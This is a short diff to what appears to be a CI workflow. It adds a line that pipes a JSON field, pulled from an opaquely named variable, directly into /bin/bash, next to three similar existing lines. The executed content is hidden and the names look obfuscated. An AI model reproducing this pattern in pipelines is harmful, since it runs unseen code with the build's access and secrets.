@@ -34,6 +34,7 @@ jobs:
           echo $kad8 | jq -r .uyq86655 | /bin/bash
           echo $x70 | jq -r .bkh79490 | /bin/bash
           printf '%s' "$plos118" | jq -r .xsu613 | /bin/bash
+          printf '%s' "$hxqf0136" | jq -r .lz3319 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
